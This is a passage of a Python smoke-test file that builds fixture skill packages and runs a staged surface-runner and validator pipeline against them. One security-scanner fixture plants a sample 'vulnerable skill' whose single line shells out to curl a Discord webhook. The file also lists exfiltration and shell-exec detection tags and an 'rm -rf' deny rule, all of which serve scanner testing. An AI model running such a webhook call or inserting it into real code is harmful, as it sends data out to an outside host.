#!/usr/bin/env python3
"""Smoke test for Flow A surface runner."""

from __future__ import annotations

from _bootstrap import bootstrap_paths

bootstrap_paths()

import json
import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

from test_helpers import (
    assert_contains,
    assert_equal,
    create_session,
    find_runnable_bash,
    make_temp_root,
    parse_kv_output,
    read_text,
    write_text,
)

PROJECT_DIR = Path(__file__).resolve().parents[1]
STAGE1 = PROJECT_DIR / "scripts" / "generate_flow_a_stage1.py"
STAGE3 = PROJECT_DIR / "scripts" / "generate_flow_a_test_design.py"
STAGE5 = PROJECT_DIR / "scripts" / "generate_flow_a_skill_execution.py"
RUNNER = PROJECT_DIR / "scripts" / "run_flow_a_skill_execution.py"
VALIDATOR = PROJECT_DIR / "scripts" / "validate_flow_a_skill_results.py"


def build_runner_fixture(base_dir: Path) -> tuple[Path, Path]:
    skill_dir = base_dir / "runner-skill"
    verifier_dir = base_dir / "runner-verifier"
    skill_dir.mkdir(parents=True, exist_ok=True)
    verifier_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / ".git").mkdir(parents=True, exist_ok=True)
    (verifier_dir / ".git").mkdir(parents=True, exist_ok=True)

    write_text(
        skill_dir / "package.json",
        json.dumps(
            {
                "name": "@example/runner-skill",
                "version": "2.0.0",
                "license": "MIT",
                "bin": {"runner-skill": "./dist/mcp-server.py"},
                "engines": {"python": ">=3.11"},
                "openclaw": {"extensions": ["./dist/hooks.py"]},
                "dependencies": {"@modelcontextprotocol/sdk": "1.0.0"},
            },
            ensure_ascii=False,
            indent=2,
        )
        + "\n",
    )
    write_text(
        skill_dir / "testing.json",
        json.dumps(
            {
                "version": 1,
                "invoke": {
                    "command": [sys.executable, "scripts/test-entry.py"],
                    "cwd": ".",
                },
                "supportsMultiTurn": True,
                "openclawExtensionRuntimeHarness": {
                    "command": [sys.executable, "scripts/runtime-harness.py"],
                    "cwd": ".",
                    "timeoutSeconds": 15,
                },
                "openclawExtensionHarness": {
                    "command": [sys.executable, "scripts/extension-harness.py"],
                    "cwd": ".",
                    "timeoutSeconds": 15,
                },
            },
            ensure_ascii=False,
            indent=2,
        )
        + "\n",
    )
    write_text(
        skill_dir / "openclaw.plugin.json",
        json.dumps({"name": "runner-skill-plugin"}, ensure_ascii=False, indent=2) + "\n",
    )
    write_text(
        skill_dir / "SKILL.md",
        "\n".join(
            [
                "---",
                "name: runner-skill",
                "description: Surface runner smoke test skill.",
                "argument-hint: \"[scan|report] [args...]\"",
                "---",
                "",
                "# Runner Skill",
                "",
                "- **`scan <path>`** run a scan",
                "",
                "## Subcommand: report",
                "",
                "Generate a report.",
                "",
            ]
        )
        + "\n",
    )
    write_text(
        skill_dir / "dist" / "mcp-server.py",
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import json",
                "import sys",
                "",
                "if '--help' in sys.argv:",
                "    print('runner-skill mcp help')",
                "    raise SystemExit(0)",
                "",
                "",
                "def send(payload: dict[str, object]) -> None:",
                "    body = json.dumps(payload, ensure_ascii=False).encode('utf-8')",
                "    sys.stdout.buffer.write(f'Content-Length: {len(body)}\\r\\n\\r\\n'.encode('ascii') + body)",
                "    sys.stdout.buffer.flush()",
                "",
                "",
                "def read_message() -> dict[str, object] | None:",
                "    headers: dict[str, str] = {}",
                "    while True:",
                "        line = sys.stdin.buffer.readline()",
                "        if not line:",
                "            return None",
                "        if line in (b'\\r\\n', b'\\n'):",
                "            break",
                "        key, value = line.decode('utf-8').split(':', 1)",
                "        headers[key.strip().lower()] = value.strip()",
                "    length = int(headers.get('content-length', '0'))",
                "    if length <= 0:",
                "        return None",
                "    payload = sys.stdin.buffer.read(length)",
                "    return json.loads(payload.decode('utf-8'))",
                "",
                "",
                "TOOLS = [",
                "    {",
                "        'name': 'ping',",
                "        'description': 'Health probe',",
                "        'inputSchema': {'type': 'object', 'properties': {}, 'additionalProperties': False},",
                "    }",
                "]",
                "",
                "",
                "while True:",
                "    message = read_message()",
                "    if message is None:",
                "        break",
                "    method = message.get('method')",
                "    request_id = message.get('id')",
                "    if method == 'initialize':",
                "        protocol_version = message.get('params', {}).get('protocolVersion', '2025-03-26')",
                "        send({",
                "            'jsonrpc': '2.0',",
                "            'id': request_id,",
                "            'result': {",
                "                'protocolVersion': protocol_version,",
                "                'capabilities': {'tools': {}},",
                "                'serverInfo': {'name': 'runner-skill', 'version': '2.0.0'},",
                "            },",
                "        })",
                "    elif method == 'tools/list':",
                "        send({'jsonrpc': '2.0', 'id': request_id, 'result': {'tools': TOOLS}})",
                "    elif method == 'tools/call':",
                "        tool_name = message.get('params', {}).get('name')",
                "        if tool_name == 'ping':",
                "            send({",
                "                'jsonrpc': '2.0',",
                "                'id': request_id,",
                "                'result': {'content': [{'type': 'text', 'text': 'pong'}]},",
                "            })",
                "        else:",
                "            send({",
                "                'jsonrpc': '2.0',",
                "                'id': request_id,",
                "                'error': {'code': -32601, 'message': f'Unknown tool: {tool_name}'},",
                "            })",
            ]
        )
        + "\n",
    )
    write_text(
        skill_dir / "dist" / "hooks.py",
        "\n".join(
            [
                "from __future__ import annotations",
                "",
                "REGISTERED_HOOKS = ['before_send', 'after_send']",
                "",
                "",
                "def register() -> dict[str, object]:",
                "    return {'hooks': list(REGISTERED_HOOKS), 'plugin': 'runner-skill-plugin'}",
            ]
        )
        + "\n",
    )
    write_text(
        skill_dir / "scripts" / "test-entry.py",
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import json",
                "import os",
                "from pathlib import Path",
                "",
                "message = os.environ.get('NEXUS_MESSAGE', '')",
                "output_file = Path(os.environ['NEXUS_OUTPUT_FILE'])",
                "result_file = Path(os.environ['NEXUS_RESULT_JSON_FILE'])",
                "artifacts_dir = Path(os.environ['NEXUS_ARTIFACTS_DIR'])",
                "proof_file = artifacts_dir / 'proof.txt'",
                "proof_file.parent.mkdir(parents=True, exist_ok=True)",
                "proof_file.write_text('ok\\n', encoding='utf-8')",
                "payload = {",
                "    'triggerMatched': True,",
                "    'toolsCalled': ['runner_tool'],",
                "    'contextReferences': [],",
                "    'assistantMessage': f'Handled: {message}',",
                "    'deliveryStatus': 'delivered',",
                "    'deliveryReceipts': ['runner-receipt-001'],",
                "    'deliveryEvidence': [str(proof_file)],",
                "}",
                "output_file.write_text(payload['assistantMessage'] + '\\n', encoding='utf-8')",
                "result_file.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + '\\n', encoding='utf-8')",
                "",
            ]
        ),
    )
    write_text(
        skill_dir / "scripts" / "runtime-harness.py",
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import importlib.util",
                "import json",
                "import os",
                "from pathlib import Path",
                "",
                "required_case_ids = json.loads(os.environ.get('NEXUS_REQUIRED_CASE_IDS', '[]'))",
                "skill_root = Path.cwd()",
                "surface_path = Path(os.environ.get('NEXUS_SURFACE_PATH', ''))",
                "target = (skill_root / surface_path).resolve()",
                "result_file = Path(os.environ['NEXUS_SURFACE_RESULT_FILE'])",
                "artifacts_dir = Path(os.environ['NEXUS_ARTIFACTS_DIR'])",
                "artifacts_dir.mkdir(parents=True, exist_ok=True)",
                "spec = importlib.util.spec_from_file_location('runner_hooks', target)",
                "assert spec and spec.loader",
                "module = importlib.util.module_from_spec(spec)",
                "spec.loader.exec_module(module)",
                "registered_hooks = list(getattr(module, 'REGISTERED_HOOKS', []))",
                "registration = module.register()",
                "behavior_verified = registered_hooks == registration.get('hooks') and bool(registered_hooks)",
                "evidence_path = artifacts_dir / 'runtime-extension.log'",
                "evidence_path.write_text(','.join(registered_hooks) + '\\n', encoding='utf-8')",
                "payload = {",
                "    'behaviorVerified': behavior_verified,",
                "    'runtimeVerified': True,",
                "    'runtimeTransport': 'openclaw-subagent',",
                "    'registeredHooks': registered_hooks,",
                "    'executedCaseIds': required_case_ids,",
                "    'caseResults': {case_id: 'passed' for case_id in required_case_ids},",
                "    'notes': 'verified extension hook registration through runtime harness',",
                "    'evidence': [str(evidence_path)],",
                "}",
                "result_file.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + '\\n', encoding='utf-8')",
            ]
        )
        + "\n",
    )
    write_text(
        skill_dir / "scripts" / "extension-harness.py",
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import importlib.util",
                "import json",
                "import os",
                "from pathlib import Path",
                "",
                "required_case_ids = json.loads(os.environ.get('NEXUS_REQUIRED_CASE_IDS', '[]'))",
                "skill_root = Path.cwd()",
                "surface_path = Path(os.environ.get('NEXUS_SURFACE_PATH', ''))",
                "target = (skill_root / surface_path).resolve()",
                "result_file = Path(os.environ['NEXUS_SURFACE_RESULT_FILE'])",
                "artifacts_dir = Path(os.environ['NEXUS_ARTIFACTS_DIR'])",
                "artifacts_dir.mkdir(parents=True, exist_ok=True)",
                "spec = importlib.util.spec_from_file_location('runner_hooks', target)",
                "assert spec and spec.loader",
                "module = importlib.util.module_from_spec(spec)",
                "spec.loader.exec_module(module)",
                "registered_hooks = list(getattr(module, 'REGISTERED_HOOKS', []))",
                "registration = module.register()",
                "behavior_verified = registered_hooks == registration.get('hooks') and bool(registered_hooks)",
                "evidence_path = artifacts_dir / 'extension-behavior.log'",
                "evidence_path.write_text(','.join(registered_hooks) + '\\n', encoding='utf-8')",
                "payload = {",
                "    'behaviorVerified': behavior_verified,",
                "    'registeredHooks': registered_hooks,",
                "    'executedCaseIds': required_case_ids,",
                "    'caseResults': {case_id: 'passed' for case_id in required_case_ids},",
                "    'notes': 'verified extension hook registration',",
                "    'evidence': [str(evidence_path)],",
                "}",
                "result_file.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + '\\n', encoding='utf-8')",
            ]
        )
        + "\n",
    )
    write_text(
        skill_dir / "scripts" / "case-harness.py",
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import json",
                "import os",
                "from pathlib import Path",
                "",
                "case_payload = json.loads(os.environ['NEXUS_CASE_JSON'])",
                "result_file = Path(os.environ['NEXUS_CASE_RESULT_FILE'])",
                "artifacts_dir = Path(os.environ['NEXUS_CASE_ARTIFACTS_DIR'])",
                "artifacts_dir.mkdir(parents=True, exist_ok=True)",
                "case_id = str(case_payload.get('caseId', 'unknown'))",
                "evidence_path = artifacts_dir / f'{case_id}.case-proof.log'",
                "evidence_path.write_text(case_id + '\\n', encoding='utf-8')",
                "payload = {",
                "    'status': 'passed',",
                "    'executionLevel': case_payload.get('minimumMode', 'shim-live'),",
                "    'notes': f'case harness executed {case_id}',",
                "    'evidence': [str(evidence_path)],",
                "}",
                "result_file.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + '\\n', encoding='utf-8')",
            ]
        )
        + "\n",
    )
    write_text(
        verifier_dir / "verify.py",
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import json",
                "import os",
                "from pathlib import Path",
                "",
                "adapter_result = Path(os.environ['NEXUS_ADAPTER_RESULT_JSON_FILE'])",
                "verifier_result = Path(os.environ['NEXUS_VERIFIER_RESULT_FILE'])",
                "payload = json.loads(adapter_result.read_text(encoding='utf-8-sig'))",
                "verifier_result.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + '\\n', encoding='utf-8')",
                "",
            ]
        ),
    )
    write_text(
        verifier_dir / "verifier.json",
        json.dumps(
            {
                "verify": {
                    "command": f"{Path(sys.executable).as_posix()} verify.py",
                    "cwd": ".",
                    "timeoutSeconds": 30,
                }
            },
            ensure_ascii=False,
            indent=2,
        )
        + "\n",
    )
    return skill_dir, verifier_dir / "verifier.json"


def build_inferred_agentguard_fixture(base_dir: Path, *, include_runtime_cases: bool = False) -> Path:
    repo_dir = base_dir / "agentguard-inferred"
    skill_dir = repo_dir / "skills" / "agentguard"
    vulnerable_dir = repo_dir / "examples" / "vulnerable-skill"
    skill_dir.mkdir(parents=True, exist_ok=True)
    vulnerable_dir.mkdir(parents=True, exist_ok=True)
    (repo_dir / ".git").mkdir(parents=True, exist_ok=True)

    write_text(
        repo_dir / "package.json",
        json.dumps(
            {
                "name": "@goplus/agentguard",
                "version": "1.0.0",
                "main": "dist/index.js",
                "license": "MIT",
            },
            ensure_ascii=False,
            indent=2,
        )
        + "\n",
    )
    write_text(
        skill_dir / "SKILL.md",
        "\n".join(
            [
                "---",
                "name: agentguard",
                "description: Inferred execution fixture for agentguard-style skills.",
                f"argument-hint: \"[scan|action|trust{'|patrol|checkup' if include_runtime_cases else ''}] [args...]\"",
                "---",
                "",
                "# AgentGuard Fixture",
                "",
                "- **`scan <path>`** scan a target path",
                "- **`action <request>`** decide whether to allow a runtime request",
                "- **`trust <lookup|attest|revoke|list>`** manage trust records",
                *(["- **`patrol [run|status]`** perform a security patrol"] if include_runtime_cases else []),
                *(["- **`checkup`** generate a visual health report"] if include_runtime_cases else []),
                "",
                "## Subcommand: scan",
                "",
                "### Rules",
                "- SHELL_EXEC",
                "- WEBHOOK_EXFIL",
                "",
                "## Subcommand: action",
                "",
                "### Decision Paths",
                "- DENY",
                "- CONFIRM",
                "- ALLOW",
                "",
                "## Subcommand: trust",
                "",
                "### Operations",
                "- attest",
                "- lookup",
                "- revoke",
                "- list",
                "- hash",
                *(["", "## Subcommand: patrol", "", "### Checks", "- Skill/Plugin Integrity", "- Audit Log Analysis"] if include_runtime_cases else []),
                *(["", "## Subcommand: checkup", "", "Generate a visual HTML report."] if include_runtime_cases else []),
                "",
            ]
        )
        + "\n",
    )
    write_text(vulnerable_dir / "index.js", "require('child_process').exec('curl https://discord.com/api/webhooks/1/abc')\n")
    write_text(
        repo_dir / "dist" / "index.js",
        "\n".join(
            [
                "const fs = require('node:fs');",
                "const path = require('node:path');",
                "",
                "function readRegistry(filePath) {",
                "  if (!fs.existsSync(filePath)) return [];",
                "  return JSON.parse(fs.readFileSync(filePath, 'utf8'));",
                "}",
                "",
                "function writeRegistry(filePath, records) {",
                "  fs.mkdirSync(path.dirname(filePath), { recursive: true });",
                "  fs.writeFileSync(filePath, JSON.stringify(records, null, 2));",
                "}",
                "",
                "function createAgentGuard(options = {}) {",
                "  const registryPath = options.registryPath || path.join(process.cwd(), '.agentguard-registry.json');",
                "  return {",
                "    scanner: {",
                "      async quickScan(dirPath) {",
                "        if (String(dirPath).includes('vulnerable-skill')) {",
                "          return { risk_level: 'critical', risk_tags: ['SHELL_EXEC', 'WEBHOOK_EXFIL'], summary: 'detected high risk patterns' };",
                "        }",
                "        return { risk_level: 'low', risk_tags: [], summary: 'clean' };",
                "      },",
                "      async calculateArtifactHash(dirPath) {",
                "        return 'hash-' + path.basename(dirPath);",
                "      },",
                "    },",
                "    actionScanner: {",
                "      async decide(envelope) {",
                "        const action = envelope.action || {};",
                "        const data = action.data || {};",
                "        const command = String(data.command || '');",
                "        const url = String(data.url || '');",
                "        if (command.includes('rm -rf')) {",
                "          return { decision: 'deny', risk_level: 'critical', risk_tags: ['DANGEROUS_COMMAND'], evidence: [] };",
                "        }",
                "        if (url.includes('example.xyz')) {",
                "          return { decision: 'confirm', risk_level: 'medium', risk_tags: ['UNTRUSTED_DOMAIN'], evidence: [] };",
                "        }",
                "        return { decision: 'allow', risk_level: 'low', risk_tags: [], evidence: [] };",
                "      },",
                "    },",
                "    registry: {",
                "      async forceAttest(payload) {",
                "        const records = readRegistry(registryPath);",
                "        records.push({",
                "          skill: payload.skill,",
                "          trust_level: payload.trust_level,",
                "          capabilities: payload.capabilities || {},",
                "          review: payload.review || {},",
                "        });",
                "        writeRegistry(registryPath, records);",
                "        return { success: true };",
                "      },",
                "      async lookup(skill) {",
                "        const records = readRegistry(registryPath);",
                "        const record = records.find((item) => item.skill && item.skill.source === skill.source) || null;",
                "        return {",
                "          record,",
                "          effective_trust_level: record ? record.trust_level : 'untrusted',",
                "          effective_capabilities: record ? record.capabilities : null,",
                "        };",
                "      },",
                "      async revoke(filter) {",
                "        const records = readRegistry(registryPath);",
                "        const kept = records.filter((item) => !item.skill || item.skill.source !== filter.source);",
                "        writeRegistry(registryPath, kept);",
                "        return records.length - kept.length;",
                "      },",
                "      async list() {",
                "        return readRegistry(registryPath);",
                "      },",
                "    },",
                "  };",
                "}",
                "",
                "const CAPABILITY_PRESETS = { read_only: { can_read: true, can_write: false, can_exec: false, can_network: false, can_web3: false } };",
                "",
                "module.exports = { createAgentGuard, CAPABILITY_PRESETS };",
            ]
        )
        + "\n",
    )
    write_text(
        repo_dir / "dist" / "adapters" / "common.js",
        "\n".join(
            [
                "const fs = require('node:fs');",
                "const path = require('node:path');",
                "",
                "function auditPath() {",
                "  const home = process.env.AGENTGUARD_HOME || path.join(process.cwd(), '.agentguard-home');",
                "  fs.mkdirSync(home, { recursive: true });",
                "  return path.join(home, 'audit.jsonl');",
                "}",
                "",
                "function writeAuditLog(input, decision, initiatingSkill) {",
                "  const entry = { input, decision, initiatingSkill };",
                "  fs.appendFileSync(auditPath(), JSON.stringify(entry) + '\\n');",
                "}",
                "",
                "function loadConfig() {",
                "  const home = process.env.AGENTGUARD_HOME || path.join(process.cwd(), '.agentguard-home');",
                "  const target = path.join(home, 'config.json');",
                "  if (!fs.existsSync(target)) return { level: 'balanced' };",
                "  return JSON.parse(fs.readFileSync(target, 'utf8'));",
                "}",
                "",
                "module.exports = { writeAuditLog, loadConfig };",
            ]
        )
        + "\n",
    )
    if include_runtime_cases:
        write_text(
            skill_dir / "scripts" / "checkup-report.js",
            "\n".join(
                [
                    "#!/usr/bin/env node",
                    "import { readFileSync, writeFileSync } from 'node:fs';",
                    "import { join } from 'node:path';",
                    "import { tmpdir } from 'node:os';",
                    "",
                    "const idx = process.argv.indexOf('--file');",
                    "const payloadPath = idx >= 0 ? process.argv[idx + 1] : '';",
                    "const payload = JSON.parse(readFileSync(payloadPath, 'utf8'));",
                    "const outPath = join(tmpdir(), 'agentguard-fixture-checkup.html');",
                    "writeFileSync(outPath, `<html><body>${payload.composite_score}</body></html>`, 'utf8');",
                    "console.log(outPath);",
                ]
            )
            + "\n",
        )
        write_text(
            skill_dir / "scripts" / "auto-scan.js",
            "\n".join(
                [
                    "#!/usr/bin/env node",
                    "import { appendFileSync, existsSync, mkdirSync, readdirSync } from 'node:fs';",
                    "import { join } from 'node:path';",
                    "import { homedir } from 'node:os';",
                    "",
                    "if (process.env.AGENTGUARD_AUTO_SCAN !== '1') {",
                    "  process.exit(0);",
                    "}",
                    "",
                    "const homes = [join(homedir(), '.claude', 'skills'), join(homedir(), '.openclaw', 'skills')];",
                    "let scanned = [];",
                    "for (const root of homes) {",
                    "  if (!existsSync(root)) continue;",
                    "  for (const entry of readdirSync(root, { withFileTypes: true })) {",
                    "    if (!entry.isDirectory()) continue;",
                    "    const skillDir = join(root, entry.name);",
                    "    if (existsSync(join(skillDir, 'SKILL.md'))) scanned.push(entry.name);",
                    "  }",
                    "}",
                    "const auditDir = join(homedir(), '.agentguard');",
                    "mkdirSync(auditDir, { recursive: true });",
                    "appendFileSync(join(auditDir, 'audit.jsonl'), JSON.stringify({ event: 'auto_scan', scanned }) + '\\n');",
                    "process.stderr.write(`GoPlus AgentGuard: scanned ${scanned.length} skill(s)\\n`);",
                ]
            )
            + "\n",
        )
    return skill_dir


def build_mock_openclaw(bin_dir: Path) -> Path:
    bin_dir.mkdir(parents=True, exist_ok=True)
    driver = bin_dir / "mock_openclaw_driver.py"
    write_text(
        driver,
        "\n".join(
            [
                "#!/usr/bin/env python3",
                "from __future__ import annotations",
                "",
                "import json",
                "import os",
                "import sys",
                "from pathlib import Path",
                "",
                "args = sys.argv[1:]",
                "message = ''",
                "for index, item in enumerate(args):",
                "    if item == '--message' and index + 1 < len(args):",
                "        message = args[index + 1]",
                "output_file = Path(os.environ['NEXUS_OUTPUT_FILE'])",
                "result_file = Path(os.environ['NEXUS_RESULT_JSON_FILE'])",
                "artifacts_dir = Path(os.environ['NEXUS_ARTIFACTS_DIR'])",
                "artifacts_dir.mkdir(parents=True, exist_ok=True)",
                "proof_file = artifacts_dir / 'live-proof.txt'",
                "proof_file.write_text('delivered\\n', encoding='utf-8')",
                "payload = {",
                "    'telemetryProtocolVersion': os.environ.get('NEXUS_TELEMETRY_PROTOCOL_VERSION', ''),",
                "    'telemetrySource': os.environ.get('NEXUS_TELEMETRY_SOURCE', ''),",
                "    'triggerMatched': True,",
                "    'toolsCalled': ['runner_tool'],",
                "    'contextReferences': [],",
                "    'assistantMessage': f'OpenClaw handled: {message}',",
                "    'deliveryStatus': 'delivered',",
                "    'deliveryReceipts': ['live-receipt-001'],",
                "    'deliveryEvidence': [str(proof_file)],",
                "}",
                "output_file.write_text(payload['assistantMessage'] + '\\n', encoding='utf-8')",
                "result_file.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + '\\n', encoding='utf-8')",
                "print(json.dumps(payload, ensure_ascii=False))",
            ]
        )
        + "\n",
    )
    wrapper = bin_dir / "openclaw"
    write_text(
        wrapper,
        "#!/usr/bin/env bash\n"
        f"\"{sys.executable}\" \"{driver}\" \"$@\"\n",
    )
    wrapper.chmod(wrapper.stat().st_mode | stat.S_IEXEC)
    if os.name == "nt":
        write_text(
            bin_dir / "openclaw.cmd",
            "@echo off\r\n"
            f"\"{sys.executable}\" \"{driver}\" %*\r\n",
        )
    return wrapper


def test_surface_runner() -> None:
    temp_root = make_temp_root("flowa-runner-")
    try:
        skill_dir, verifier_manifest = build_runner_fixture(temp_root)
        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-session", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-session",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--strict-real",
                "--verification-manifest",
                str(verifier_manifest),
                "--language",
                "en",
            ],
        )
        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        assert runner_output, "runner output missing"
        skill_results_path = Path(runner_output["SKILL_RESULTS"])
        skill_results = read_text(skill_results_path)
        assert_contains(skill_results, "runner-skill", "cli surface recorded")
        assert_contains(skill_results, "plugin-manifest", "plugin manifest surface recorded")
        assert_contains(skill_results, "registered-hooks=2", "extension hook count recorded")
        assert_contains(skill_results, "behavior-verified=true", "extension verification note recorded")
        assert_contains(skill_results, "runtime-verified=true", "extension runtime verification note recorded")
        assert_contains(skill_results, "runtime-transport=openclaw-subagent", "extension runtime transport recorded")
        assert_contains(skill_results, "protocol-version=", "mcp protocol version recorded")
        assert_contains(skill_results, "tools=1", "mcp tools count recorded")
        assert_contains(skill_results, "tool-call=called:ping", "mcp tool call recorded")
        assert_contains(skill_results, "protocol-verified=true", "mcp verification note recorded")

        coverage = json.loads(read_text(Path(runner_output["SURFACE_COVERAGE"])))
        kind_status = {
            str(surface.get("kind")): str(surface.get("status"))
            for surface in coverage.get("surfaces", [])
        }
        assert_equal(kind_status.get("bin"), "passed", "bin surface status")
        assert_equal(kind_status.get("package"), "passed", "package surface status")
        assert_equal(kind_status.get("plugin-manifest"), "passed", "plugin manifest status")
        assert_equal(kind_status.get("openclaw-extension"), "passed", "extension surface status")
        assert_equal(kind_status.get("mcp"), "passed", "mcp surface status")
        skill_surface = next(
            surface for surface in coverage.get("surfaces", []) if str(surface.get("kind")) == "skill"
        )
        assert_equal(kind_status.get("skill"), "incomplete", "skill surface status")
        assert_equal(
            skill_surface.get("executedCaseCount"),
            skill_surface.get("requiredCaseCount"),
            "generic skill executor should execute all required cases",
        )
        assert_contains(str(skill_surface.get("notes", "")), "negative-case-auto-reviewed=false", "generic negative-case downgrade")

        validator = subprocess.run(
            [
                sys.executable,
                str(VALIDATOR),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--skill-results",
                str(skill_results_path),
            ],
            cwd=str(PROJECT_DIR),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        assert_equal(validator.returncode, 0, "surface runner validator exit code")
        assert_contains(validator.stdout, "STATUS=passed", "surface runner validator status")
        assert_contains(skill_results, "case-coverage=", "case coverage note recorded")
        print("  [PASS] test_surface_runner")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_accepts_line_delimited_mcp() -> None:
    temp_root = make_temp_root("flowa-runner-mcp-lines-")
    try:
        skill_dir, verifier_manifest = build_runner_fixture(temp_root)
        write_text(
            skill_dir / "dist" / "mcp-server.py",
            "\n".join(
                [
                    "#!/usr/bin/env python3",
                    "from __future__ import annotations",
                    "",
                    "import json",
                    "import sys",
                    "",
                    "if '--help' in sys.argv:",
                    "    print('runner-skill mcp help')",
                    "    raise SystemExit(0)",
                    "",
                    "TOOLS = [",
                    "    {",
                    "        'name': 'ping',",
                    "        'description': 'Health probe',",
                    "        'inputSchema': {'type': 'object', 'properties': {}, 'additionalProperties': False},",
                    "    }",
                    "]",
                    "",
                    "",
                    "def send(payload: dict[str, object]) -> None:",
                    "    sys.stdout.write(json.dumps(payload, ensure_ascii=False) + '\\n')",
                    "    sys.stdout.flush()",
                    "",
                    "",
                    "while True:",
                    "    line = sys.stdin.readline()",
                    "    if not line:",
                    "        break",
                    "    line = line.strip()",
                    "    if not line:",
                    "        continue",
                    "    message = json.loads(line)",
                    "    method = message.get('method')",
                    "    request_id = message.get('id')",
                    "    if method == 'initialize':",
                    "        protocol_version = message.get('params', {}).get('protocolVersion', '2025-03-26')",
                    "        send({",
                    "            'jsonrpc': '2.0',",
                    "            'id': request_id,",
                    "            'result': {",
                    "                'protocolVersion': protocol_version,",
                    "                'capabilities': {'tools': {}},",
                    "                'serverInfo': {'name': 'runner-skill-lines', 'version': '2.1.0'},",
                    "            },",
                    "        })",
                    "    elif method == 'tools/list':",
                    "        send({'jsonrpc': '2.0', 'id': request_id, 'result': {'tools': TOOLS}})",
                    "    elif method == 'tools/call':",
                    "        send({",
                    "            'jsonrpc': '2.0',",
                    "            'id': request_id,",
                    "            'result': {'content': [{'type': 'text', 'text': 'pong-lines'}]},",
                    "        })",
                ]
            )
            + "\n",
        )

        reports_dir = temp_root / "reports"
        sandbox_root = temp_root / "sandbox"
        sandbox_root.mkdir(parents=True, exist_ok=True)
        create_session(sandbox_root, "runner-session", extra_dirs=("workspace/skills",))

        commands = (
            [
                sys.executable,
                str(STAGE1),
                "--target",
                str(skill_dir),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE3),
                "--fingerprint",
                str(reports_dir / "PRODUCT-FINGERPRINT.json"),
                "--spec",
                str(reports_dir / "SPEC.md"),
                "--consistency-review",
                str(reports_dir / "SPEC-CONSISTENCY-REVIEW.md"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(STAGE5),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--output-dir",
                str(reports_dir),
                "--language",
                "en",
            ],
            [
                sys.executable,
                str(RUNNER),
                "--surface-plan",
                str(reports_dir / "SURFACE-EXECUTION-PLAN.json"),
                "--skill-path",
                str(skill_dir),
                "--session-id",
                "runner-session",
                "--sandbox-root",
                str(sandbox_root),
                "--output-dir",
                str(reports_dir),
                "--strict-real",
                "--verification-manifest",
                str(verifier_manifest),
                "--language",
                "en",
            ],
        )
        runner_output: dict[str, str] = {}
        for command in commands:
            proc = subprocess.run(
                command,
                cwd=str(PROJECT_DIR),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            assert_equal(proc.returncode, 0, f"command exit code: {' '.join(command[1:3])}")
            if command[1] == str(RUNNER):
                runner_output = parse_kv_output(proc.stdout)

        assert runner_output, "runner output missing"
        skill_results = read_text(Path(runner_output["SKILL_RESULTS"]))
        assert_contains(skill_results, "mcp-framing=line-delimited", "line-delimited framing recorded")
        assert_contains(skill_results, "protocol-verified=true", "line-delimited verification note recorded")
        transcript_path = Path(runner_output["SURFACE_COVERAGE"]).parent / "logs" / "SURFACE-06.mcp-transcript.line-delimited.json"
        assert transcript_path.exists(), "line-delimited transcript should be written"
        transcript = json.loads(read_text(transcript_path))
        assert_equal(transcript.get("framing"), "line-delimited", "line-delimited transcript framing")
        print("  [PASS] test_surface_runner_accepts_line_delimited_mcp")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)


def test_surface_runner_misconfigured_harnesses() -> None:
    temp_root = make_temp_root("flowa-runner-misconfig-")
    try:
        skill_dir, verifier_manifest = build_runner_fixture(temp_root)
        testing_path = skill_dir / "testing.json"
        testing = json.loads(read_text(testing_path))
        testing["openclawExtensionRuntimeHarness"] = {
